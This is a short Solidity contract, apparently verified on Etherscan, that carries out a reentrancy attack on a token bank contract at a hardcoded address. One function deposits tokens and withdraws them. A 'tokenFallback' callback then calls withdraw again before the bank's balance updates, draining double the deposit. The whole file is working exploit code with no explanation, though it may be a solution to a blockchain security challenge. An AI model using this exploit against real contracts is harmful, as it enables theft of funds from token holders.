/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

pragma solidity ^0.4.21;

interface ITokenBank {
    function withdraw(uint256 amount) external;
}

interface IToken {
    function transfer(address to, uint256 value) external returns (bool success);
}

contract AhhhImReenteringggggg {

    address public owner;
    address public bank = 0x0695519F0B10ef04366Fa7ba5940eD10b52DcDdC;
    address public token = 0x7B627E8205A484419F25f2D995Cfab3089b5d10A;
    uint256 public balance = 500000 * 10**18;
    bool internal hasBeenCalled;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function rektThem() public onlyOwner {
        //Deposit to bank so this contract is credited
        IToken(token).transfer(bank,balance);
        //Withdraw my tokens so that the token calls _MY_ function 
        ITokenBank(bank).withdraw(balance);
    }

    function tokenFallback(address from, uint256 value, bytes data) external {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ITokenBank(bank).withdraw(balance);
        }
    }
}